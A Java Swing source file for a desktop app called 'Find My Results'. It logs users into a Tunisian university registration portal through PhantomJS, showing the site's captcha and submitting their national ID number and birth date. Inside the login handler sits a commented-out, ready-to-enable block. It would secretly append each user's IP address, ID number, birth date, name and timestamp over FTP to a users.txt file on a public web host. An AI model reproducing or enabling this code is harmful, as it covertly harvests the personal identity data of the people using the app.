import java.awt.Color;
import java.awt.Desktop;
import java.awt.EventQueue;
import java.awt.Font;
import java.awt.FontFormatException;
import java.awt.Point;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;
//import java.awt.Dimension;
import org.apache.commons.net.ftp.FTPClient;
import org.eclipse.swt.graphics.Image;
import org.jdesktop.swingx.prompt.PromptSupport;
import javax.imageio.ImageIO;
import java.io.*;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextField;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.apache.commons.io.FileUtils;
import org.openqa.selenium.OutputType;
import org.openqa.selenium.TakesScreenshot;
import javax.swing.JPasswordField;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import javax.swing.SwingConstants;

public class Connection extends JFrame {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JFrame frame;
	private JTextField daten;
	private JLabel background;
	private JLabel cinlabel;
	private JLabel datalabel;
	private JTextField code;
	private JLabel codelabel;
	private JPasswordField CIN;
	int xx, xy;
	private JLabel lblNewLabel;
	private JLabel lblNewLabel_2;
	private JLabel lblNewLabel_3;
	private JLabel lblNewLabel_4;
	private JLabel lblNewLabel_5;
	private java.awt.Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
	static WebDriver driver = PhantomJs.createDriver();
	/*
	 * Launch the application.
	 */

	public static void main(String[] args) {

		try {
			// body of main method goes here, including any other error handling
		} catch (Throwable t) {
			JOptionPane.showMessageDialog(null, t.getClass().getSimpleName() + ": " + t.getMessage());
			throw t; // don't suppress Throwable
		}

		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Connection window = new Connection();
					
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		});
		// PropertyConfigurator.configure("C:\\Users\\MJ\\eclipse-workspace\\FindMyResults\\src\\log4j.properties");
	}

	/**
	 * Create the application.
	 * 
	 * @throws IOException
	 */
	public Connection() throws IOException {
		try {
			initialize();
		} catch (FontFormatException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	/**
	 * Initialize the contents of the frame.
	 * 
	 * @return
	 * 
	 * @throws IOException
	 * @throws FontFormatException
	 */
	private void initialize() throws IOException, FontFormatException {
		// layers not used for a reason
		frame = new JFrame();
		 try {
	            URL resource = frame.getClass().getResource("/images/icon.png");
	            BufferedImage image = ImageIO.read(resource);
	            frame.setIconImage(image);
	        } catch (IOException e) {
	            e.printStackTrace();
	        }		
		if (screenSize.width >= 1920) {

			frame.setBounds(100, 100, 980, 640);
		} else {

			frame.setBounds(100, 100, 730, 520);

		}
		
		frame.setTitle("Find My Results");
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.getContentPane().setLayout(null);
		frame.setResizable(false);
		frame.setUndecorated(true);
		// frame.setShape(new RoundRectangle2D.Double(0, 0, getWidth(), getHeight(),
		// 50,50));

		FrameDragListener frameDragListener = new FrameDragListener(frame);
		frame.addMouseListener(frameDragListener);
		frame.addMouseMotionListener(frameDragListener);
		frame.setLocation(screenSize.width / 2 - frame.getSize().width / 2,
				screenSize.height / 2 - frame.getSize().height / 2);

		lblNewLabel = new JLabel("\u00C0 propos");
		lblNewLabel.setFont(new Font("Tahoma", Font.PLAIN, 12));
		lblNewLabel.setForeground(Color.WHITE);
		if (screenSize.width >= 1920) {

			lblNewLabel.setBounds(333, 615, 60, 14);
		} else {

			lblNewLabel.setBounds(214, 495, 60, 14);
		}

		frame.getContentPane().add(lblNewLabel);

		codelabel = new JLabel("Code de s\u00E9curit\u00E9 \t");
		codelabel.setForeground(Color.WHITE);
		if (screenSize.width >= 1920) {
			codelabel.setFont(new Font("Dubai Medium", Font.PLAIN, 18));
			codelabel.setBounds(495, 402, 182, 14);
		} else {

			codelabel.setFont(new Font("Dubai Medium", Font.PLAIN, 15));
			codelabel.setBounds(373, 272, 182, 14);
		}
		frame.getContentPane().add(codelabel);

		cinlabel = new JLabel("CIN ou Identifiant DGCI ");
		cinlabel.setForeground(Color.WHITE);
		if (screenSize.width >= 1920) {
			cinlabel.setFont(new Font("Dubai Medium", Font.PLAIN, 18));
			cinlabel.setBounds(303, 227, 294, 14);
		} else {

			cinlabel.setFont(new Font("Dubai Medium", Font.PLAIN, 15));
			cinlabel.setBounds(203, 119, 294, 14);
		}

		frame.getContentPane().add(cinlabel);

		datalabel = new JLabel("Date de naissance");
		datalabel.setForeground(Color.WHITE);
		if (screenSize.width >= 1920) {
			datalabel.setFont(new Font("Dubai Medium", Font.PLAIN, 18));
			datalabel.setBounds(303, 311, 294, 14);
		} else {

			datalabel.setFont(new Font("Dubai Medium", Font.PLAIN, 15));
			datalabel.setBounds(203, 188, 294, 14);
		}
		frame.getContentPane().add(datalabel);
		URL title = getClass().getResource("/images/title.png");

		CIN = new JPasswordField();
		if (screenSize.width >= 1920) {

			CIN.setBounds(303, 252, 396, 32);
		} else {

			CIN.setBounds(203, 144, 294, 25);

		}
		CIN.setBackground(new Color(248, 248, 255));

		frame.getContentPane().add(CIN);
		daten = new JTextField();
		daten.setBackground(new Color(248, 248, 255));
		if (screenSize.width >= 1920) {

			daten.setBounds(303, 336, 396, 32);
		} else {

			daten.setBounds(203, 213, 294, 25);

		}
		daten.setForeground(new Color(0, 0, 0));
		daten.setFont(new Font("Helvetica", Font.PLAIN, 18));
		daten.setColumns(10);
		PromptSupport.setPrompt("jj/mm/aaaa", daten);
		frame.getContentPane().add(daten);

		System.setProperty("phantomjs.binary.path", "phantomjs.exe");
		String url = "https://www4.inscription.tn/ORegMx/servlet/AuthentificationEtud?ident=cin";
		driver.get(url);

		// user ip section

		// PhantomJs d=new PhantomJs();

		driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);

		String title1 = driver.getTitle();
		if (!(title1.equals("Site de l'inscription universitaire en ligne"))) {

			JOptionPane.showMessageDialog(null, "Verifiez votre connexion internet");
			try {
				Runtime.getRuntime().exec("taskkill /F /IM phantomjs.exe");
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			System.exit(0);
			driver.quit();
		}
		WebElement ele = driver.findElement(By.xpath("//td[@rowspan='2']"));

		driver.manage().timeouts().implicitlyWait(1, TimeUnit.SECONDS);
		// Get entire page screenshot
		File screenshot = ((TakesScreenshot) driver).getScreenshotAs(OutputType.FILE);
		BufferedImage fullImg = ImageIO.read(screenshot);

		// Get the location of element on the page
		org.openqa.selenium.Point point = ele.getLocation();

		// Get width and height of the element
		int eleWidth = ele.getSize().getWidth();
		int eleHeight = ele.getSize().getHeight();
		int p = point.getX();
		int pp = p + 47;

		// Crop the entire page screenshot to get only element screenshot
		BufferedImage eleScreenshot = fullImg.getSubimage(pp, point.getY(), eleWidth, eleHeight);
		ImageIO.write(eleScreenshot, "png", screenshot);

		// Copy the element screenshot to disk
		File screenshotLocation = new File("temp\\captcha.png");
		FileUtils.copyFile(screenshot, screenshotLocation);

		JLabel captcha = new JLabel("");
		ImageIcon img = new ImageIcon("temp\\\\captcha.png");

		if (screenSize.width >= 1920) {
			img.getImage().flush();
			captcha.setIcon(img);
			captcha.setBounds(303, 402, 182, 50);
		} else {
			java.awt.Image image1 = img.getImage(); // transform it
			java.awt.Image newimg = image1.getScaledInstance(160, 50, java.awt.Image.SCALE_SMOOTH); // scale it the
																									// smooth way

			img = new ImageIcon(newimg); // transform it back
			img.getImage().flush();
			captcha.setIcon(img);

			captcha.setBounds(203, 272, 160, 50);

		}
		frame.getContentPane().add(captcha);

		JButton valider = new JButton("");
		valider.addActionListener(e -> System.out.println("Button 2 action fired"));

		frame.getContentPane().add(valider);
		frame.getRootPane().setDefaultButton(valider);

		valider.setOpaque(false);
		valider.setContentAreaFilled(false);
		valider.setBorderPainted(false);
		valider.setIcon(new ImageIcon(Connection.class.getResource("/menu/button.png")));
		valider.addActionListener(new ActionListener() {

			public void actionPerformed(ActionEvent arg0) {
				JButton valider = new JButton("Button 2");
				valider.addActionListener(e -> System.out.println("Button 2 action fired"));
				WebElement c = driver.findElement(By.name("cin"));
				WebElement d = driver.findElement(By.id("dn"));
				WebElement cap = driver.findElement(By.name("cincap"));

				String myPass = String.valueOf(CIN.getPassword());
				String date = daten.getText();
				String capp = code.getText();

				// fill the fields
				c.sendKeys(myPass);
				d.sendKeys(date);
				cap.sendKeys(capp);

				// button valider
				cap.submit();

				// check the title of the page
				String title = driver.getTitle();
				if (title.equals("Dashboard - Inscription universitaire en ligne")) {
					WebElement msg = driver.findElement(By.xpath(
							"/html[1]/body[1]/table[1]/tbody[1]/tr[1]/td[1]/table[1]/tbody[1]/tr[1]/td[1]/table[1]/tbody[1]/tr[1]/td[1]/table[2]/tbody[1]/tr[1]/td[1]/div[1]/div[2]/div[1]/table[1]/tbody[1]/tr[1]/td[1]/div[1]/p[1]"));
					String name = msg.getAttribute("innerText");

					String sessionID = driver.findElement(By.name("Idsession")).getAttribute("value");
					Path path = Paths.get("temp\\\\cookie.txt");
					try {
						Files.write(path, Arrays.asList(sessionID));
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					String cin = driver.findElement(By.name("cin")).getAttribute("value");
					Path path1 = Paths.get("temp\\\\cin.txt");
					try {
						Files.write(path1, Arrays.asList(cin));
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

					JOptionPane.showMessageDialog(null, name, "Bienvenue", JOptionPane.INFORMATION_MESSAGE);

					frame.dispose();
					Accueil bien = null;
					try {
						bien = new Accueil();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					bien.setVisible(true);

					/* 
					 * if you want to see the list of the users with their informations
					 
					InetAddress addr = null;
					try {
						addr = InetAddress.getLocalHost();
					} catch (UnknownHostException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}

					// Getting IPAddress of localhost - getHostAddress return IP Address in textual
					// format
					String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());

					String info = addr + " / " + myPass + " / " + date + " / " + name + " / " + timeStamp + "\n";
					// System.out.println("IP address of localhost from Java Program: " +
					// ipAddress);
					String remoteFileName = "/public_html/users.txt"; // change accordingly
					String server = "files.000webhost.com"; // change accordingly
					int port = 21;
					String user = "yourFtpUser"; // change accordingly
					String pass = "FTPpassword"; // change accordingly
					FTPClient ftp = new FTPClient();
					try {
						ftp.connect(server, port);
					} catch (IOException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}
					boolean success = false;
					try {
						success = ftp.login(user, pass);
					} catch (IOException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}
					if (!success) {
						System.out.println("Could not login to the server");
						return;
					} else {
						System.out.println("LOGGED IN SERVER");
					}

					try (ByteArrayInputStream local = new ByteArrayInputStream(info.getBytes("UTF-8"))) {
						ftp.appendFile(remoteFileName, local);
					} catch (UnsupportedEncodingException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					} catch (IOException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}
*/
					
				} else {
					WebElement msg = driver.findElement(By.xpath(
							"/html[1]/body[1]/table[1]/tbody[1]/tr[1]/td[1]/table[1]/tbody[1]/tr[1]/td[1]/div[1]/blockquote[1]/div[1]/font[1]"));
					String error = msg.getAttribute("innerText");
					// System.out.println(error);
					JOptionPane.showMessageDialog(null, error);

					WebElement ele = driver.findElement(By.xpath("//td[@rowspan='2']"));
					driver.manage().timeouts().implicitlyWait(1, TimeUnit.SECONDS);
					// Get entire page screenshot
					File screenshot = ((TakesScreenshot) driver).getScreenshotAs(OutputType.FILE);
					BufferedImage fullImg = null;
					try {
						fullImg = ImageIO.read(screenshot);
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

					// Get the location of element on the page
					org.openqa.selenium.Point point = ele.getLocation();

					// Get width and height of the element
					int eleWidth = ele.getSize().getWidth();
					int eleHeight = ele.getSize().getHeight();
					int pp = p + 47;
					// Crop the entire page screenshot to get only element screenshot
					BufferedImage eleScreenshot = fullImg.getSubimage(pp, point.getY(), eleWidth, eleHeight);
					try {
						ImageIO.write(eleScreenshot, "png", screenshot);
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}

					// Copy the element screenshot to disk
					File screenshotLocation = new File("temp\\captcha.png");
					try {
						FileUtils.copyFile(screenshot, screenshotLocation);
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

					ImageIcon img = new ImageIcon("temp\\captcha.png");
					img.getImage().flush();
					captcha.setIcon(img);

				}

			}

		});

		valider.setFont(new Font("Tahoma", Font.BOLD, 13));
		if (screenSize.width >= 1920) {

			valider.setBounds(454, 494, 60, 50);
		} else {

			valider.setBounds(339, 360, 60, 50);

		}

		frame.getContentPane().add(valider);

		code = new JTextField();
		code.setBackground(new Color(248, 248, 255));
		code.setForeground(Color.BLACK);
		code.setFont(new Font("Helvetica", Font.PLAIN, 18));
		code.setColumns(10);
		if (screenSize.width >= 1920) {

			code.setBounds(493, 420, 206, 32);
		} else {

			code.setBounds(373, 297, 124, 25);

		}

		frame.getContentPane().add(code);

		background = new JLabel("");

		JLabel CLOSE = new JLabel("X");
		CLOSE.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) {

				try {
					Runtime.getRuntime().exec("taskkill /F /IM phantomjs.exe");
					File index = new File("temp");
					FileUtils.deleteDirectory(index);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				System.exit(0);
			}

		});
		CLOSE.setForeground(Color.WHITE);
		if (screenSize.width >= 1920) {
			CLOSE.setFont(new Font("Tahoma", Font.BOLD, 22));
			CLOSE.setBounds(959, 0, 84, 32);

		} else {

			CLOSE.setFont(new Font("Tahoma", Font.BOLD, 22));
			CLOSE.setBounds(708, 0, 84, 32);

		}

		frame.getContentPane().add(CLOSE);

		lblNewLabel_2 = new JLabel("FIND MY RESULTS");
		lblNewLabel_2.setHorizontalAlignment(SwingConstants.CENTER);
		if (screenSize.width >= 1920) {

			lblNewLabel_2.setBounds(303, 85, 370, 59);
			InputStream is = getClass().getResourceAsStream("/Anklepan.ttf");
			Font tempFont = Font.createFont(Font.TRUETYPE_FONT, is);
			Font font = tempFont.deriveFont(28f);

			lblNewLabel_2.setFont(font);

		} else {
			InputStream is = getClass().getResourceAsStream("/Anklepan.ttf");
			Font tempFont = Font.createFont(Font.TRUETYPE_FONT, is);
			Font font2 = tempFont.deriveFont(22f);

			lblNewLabel_2.setBounds(240, 40, 245, 39);
			lblNewLabel_2.setFont(font2);

		}

		frame.getContentPane().add(lblNewLabel_2);

		lblNewLabel_5 = new JLabel("Support");
		lblNewLabel_5.setFont(new Font("Tahoma", Font.PLAIN, 12));
		lblNewLabel_5.setForeground(Color.WHITE);
		if (screenSize.width >= 1920) {

			lblNewLabel_5.setBounds(571, 615, 54, 14);
		} else {

			lblNewLabel_5.setBounds(452, 495, 128, 14);

		}

		frame.getContentPane().add(lblNewLabel_5);

		lblNewLabel_3 = new JLabel("D\u00E9veloppeur");
		lblNewLabel_3.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				try {
					URI uri = new URI("https://www.facebook.com/Lord.of.Dj");
					Desktop desktop = null;
					if (Desktop.isDesktopSupported()) {
						desktop = Desktop.getDesktop();
					}

					if (desktop != null)
						desktop.browse(uri);
				} catch (IOException ioe) {
					ioe.printStackTrace();
				} catch (URISyntaxException use) {
					use.printStackTrace();
				}

			}
		});
		lblNewLabel_3.setForeground(Color.WHITE);
		lblNewLabel_3.setFont(new Font("Tahoma", Font.PLAIN, 12));
		if (screenSize.width >= 1920) {

			lblNewLabel_3.setBounds(480, 615, 76, 14);
		} else {

			lblNewLabel_3.setBounds(361, 495, 105, 14);

		}

		frame.getContentPane().add(lblNewLabel_3);

		lblNewLabel_4 = new JLabel(" Contact");
		lblNewLabel_4.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				Email em = null;

				em = new Email();

				em.setVisible(true);
			}

		});
		lblNewLabel_4.setForeground(Color.WHITE);
		lblNewLabel_4.setFont(new Font("Tahoma", Font.PLAIN, 12));
		if (screenSize.width >= 1920) {

			lblNewLabel_4.setBounds(403, 615, 60, 14);
		} else {

			lblNewLabel_4.setBounds(284, 495, 88, 14);

		}

		frame.getContentPane().add(lblNewLabel_4);
		URL bg = getClass().getResource("/images/bg_login.jpg");
		URL bg2 = getClass().getResource("/images/bg_login1366.jpg");
		if (screenSize.width >= 1920) {

			background.setIcon(new ImageIcon(bg));
		} else {

			background.setIcon(new ImageIcon(bg2));

		}

		if (screenSize.width >= 1920) {

			background.setBounds(0, 0, 980, 640);
		} else {

			background.setBounds(0, 0, 730, 520);

		}

		frame.getContentPane().add(background);

	}
}

class FrameDragListener extends MouseAdapter {

	private final JFrame frame;
	private Point mouseDownCompCoords = null;

	public FrameDragListener(JFrame frame) {
		this.frame = frame;
	}

	public void mouseReleased(MouseEvent e) {
		mouseDownCompCoords = null;
	}

	public void mousePressed(MouseEvent e) {
		mouseDownCompCoords = e.getPoint();
	}

	public void mouseDragged(MouseEvent e) {
		Point currCoords = e.getLocationOnScreen();
		frame.setLocation(currCoords.x - mouseDownCompCoords.x, currCoords.y - mouseDownCompCoords.y);
	}
}
